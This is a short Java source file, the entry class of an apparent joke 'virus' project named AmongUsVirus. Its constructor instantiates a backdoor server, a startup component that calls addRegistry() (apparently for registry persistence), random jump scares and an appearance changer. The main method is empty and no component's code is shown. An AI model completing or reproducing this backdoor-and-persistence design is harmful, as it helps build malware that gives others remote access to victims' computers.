package com.github.pulsebeat02;

import com.github.pulsebeat02.appearance.AppearanceChanger;
import com.github.pulsebeat02.backdoor.BackDoorServer;
import com.github.pulsebeat02.backdoor.ServerStartup;
import com.github.pulsebeat02.jumpscare.RandomJumpScare;

public class AmongUsVirus {

    private final BackDoorServer server;
    private final ServerStartup startup;
    private final RandomJumpScare jumpScare;
    private final AppearanceChanger changer;

    public AmongUsVirus() {
        jumpScare = new RandomJumpScare();
        server = new BackDoorServer();
        startup = new ServerStartup();
        startup.addRegistry();
        changer = new AppearanceChanger();
    }

    public static void main(final String[] args) {

    }

}
